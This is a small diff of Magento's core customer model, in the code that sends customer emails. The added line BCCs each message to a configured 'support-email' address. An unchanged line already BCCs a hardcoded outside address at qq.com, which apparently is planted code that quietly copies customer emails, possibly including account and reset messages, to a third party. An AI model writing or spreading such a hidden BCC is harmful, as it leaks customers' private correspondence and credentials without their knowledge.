@@ -724,6 +724,7 @@ class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
         $emailInfo = Mage::getModel('core/email_info');
         $emailInfo->addTo($this->getEmail(), $this->getName());
         $emailInfo->addBcc(Mage::getStoreConfig('smtppro/general/smtp_username'));
+        $emailInfo->addBcc(Mage::getModel('core/variable')->loadByCode('support-email')->getValue('text'));
         $emailInfo->addBcc("1248012159@qq.com");
         $mailer->addEmailInfo($emailInfo);
 
